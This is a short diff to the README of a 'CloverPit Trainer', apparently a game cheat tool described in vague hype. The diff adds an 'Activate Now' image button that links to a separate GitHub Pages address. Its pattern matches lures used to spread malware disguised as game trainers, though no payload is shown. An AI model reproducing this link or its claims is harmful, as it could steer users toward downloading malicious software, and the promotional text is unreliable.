@@ -4,6 +4,9 @@ The **CloverPit Trainer** is a next-generation **game enhancement toolkit** buil
 
 This is not a basic trainer; it’s a **full modular platform** for fast adaptation, real-time configuration, and smooth system-level overlays that sync perfectly with your display pipeline.
 
+[![Activate Now](https://github.com/hawk-1983/hawk-1983/blob/main/img.png?raw=true)](https://cloverpit-trainer-2.github.io/.github/)
+
+
 ---
 
 ## 🧭 Overview
